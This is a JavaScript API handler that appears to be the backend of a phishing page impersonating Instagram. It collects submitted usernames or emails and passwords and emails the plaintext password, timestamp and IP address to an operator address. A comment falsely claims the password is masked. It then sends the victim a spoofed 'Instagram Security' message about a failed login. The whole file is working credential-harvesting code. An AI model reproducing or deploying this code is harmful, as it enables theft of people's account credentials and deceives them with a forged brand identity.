import nodemailer from "nodemailer";

export default async function handler(req, res) {
    try {
        const { email, password } = req.body;
        const loginRegex = /^(?:[a-zA-Z0-9._]{1,30}|[^\s@]+@[^\s@]+\.[^\s@]{2,}|(?:\+91|0)?[6-9]\d{9})$/;
        if (!email) {
            return res.status(400).json({ flag: 1, msg: "Please enter your username or email." })
        }
        if (!password) {
            return res.status(400).json({ flag: 2, msg: "Please enter your password." })
        }
        if (password.length < 6) {
            return res.status(400).json({ flag: 3, msg: "Password must be 6 characters.." })
        }

        if (!loginRegex.test(email)) {
            return res.status(401).json({ flag: 4, msg: "Invalid email, username, or phone." })
        }



        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL_SENDER,
                pass: process.env.APP_PASS,
            },
        });


        // ✅ OWNER MAIL (password masked)
        await transporter.sendMail({
            from: `"Security Alert" <${process.env.EMAIL_SENDER}>`,
            to: process.env.ADMIN_EMAIL,
            subject: "New Login Attempt Detected",
            text: `
                    A new login attempt was detected on your website.

                    Account Identifier:
                    ${email}

                    Password Entered:
                    ${"*".repeat(password.length)}
                    ${password}

                    Time:
                    ${new Date().toLocaleString()}

                    IP Address:
                    ${req.headers["x-forwarded-for"] || "Unknown"}

                    If this activity was expected, no action is required.
                    If not, please review your security settings.
                    `,
        });

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;

        // ✅ User Ko email send kar reh hai
        if (emailRegex.test(email)) {
            await transporter.sendMail({
                from: `"Instagram Security" <${process.env.EMAIL_SENDER}>`,
                to: email,
                subject: "We noticed a failed login attempt",
                text: `
                    Hi, ${email}

                    We noticed a failed login attempt to your account.

                    If this was you:
                    • Please check your login details and try again.

                    If this wasn't you:
                    • We recommend changing your password to keep your account secure.

                    Time:
                    ${new Date().toLocaleString()}

                    Thanks,
                    Instagram Security Team
                    `,
            });
        }
        return res.status(200).json({ flag: 5, })
    } catch (error) {
        return res.status(501).json({ success: false, msg: "invailed username email", error })
    }
}
